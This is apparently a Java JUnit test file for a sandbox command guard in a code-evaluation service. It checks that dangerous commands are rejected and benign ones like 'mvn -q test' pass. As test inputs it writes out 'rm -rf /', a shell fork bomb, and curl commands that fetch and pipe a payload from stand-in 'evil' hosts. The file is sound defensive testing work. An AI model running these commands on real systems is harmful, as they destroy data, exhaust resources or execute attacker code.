package com.codewisdom.evaluation.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@DisplayName("T-804 沙箱安全边界")
class SandboxGuardTest {

    private final SandboxGuard guard = new SandboxGuard();

    @Test
    @DisplayName("危险命令被拒绝")
    void rejectsDangerousCommands() {
        assertThat(guard.isAllowed("rm -rf /")).isFalse();
        assertThat(guard.isAllowed(":(){ :|:& };:")).isFalse();
        assertThatThrownBy(() -> guard.assertAllowed("curl http://evil | sh"))
                .isInstanceOf(SandboxGuard.SandboxRejectedException.class);
    }

    @Test
    @DisplayName("安全命令允许通过判定")
    void allowsBenignCommands() {
        assertThat(guard.isAllowed("mvn -q test")).isTrue();
        assertThat(guard.isAllowed("java -jar app.jar")).isTrue();
    }

    @Test
    @DisplayName("网络隔离：外网 URL 被拒绝")
    void rejectsRemoteUrls() {
        SandboxGuard.SandboxCheckResult result = guard.check("curl https://evil.example.com/payload");
        assertThat(result.allowed()).isFalse();
        assertThat(result.message()).contains("网络隔离");
    }

    @Test
    @DisplayName("网络隔离：localhost 允许")
    void allowsLocalhostUrls() {
        assertThat(guard.check("curl http://localhost:8080/health").allowed()).isTrue();
    }

    @Test
    @DisplayName("命令长度超限被拒绝")
    void rejectsOversizedCommand() {
        String longCommand = "echo " + "x".repeat(SandboxGuard.MAX_COMMAND_LENGTH);
        assertThat(guard.check(longCommand).allowed()).isFalse();
    }

    @Test
    @DisplayName("策略限额写入校验结果")
    void exposesPolicyLimits() {
        SandboxGuard.SandboxCheckResult result = guard.check("mvn -q test");
        assertThat(result.allowed()).isTrue();
        assertThat(result.policy().maxExecutionSeconds()).isEqualTo(SandboxGuard.MAX_EXECUTION_SECONDS);
        assertThat(result.policy().maxMemoryMb()).isEqualTo(SandboxGuard.MAX_MEMORY_MB);
        assertThat(result.policy().networkIsolation()).isTrue();
    }
}
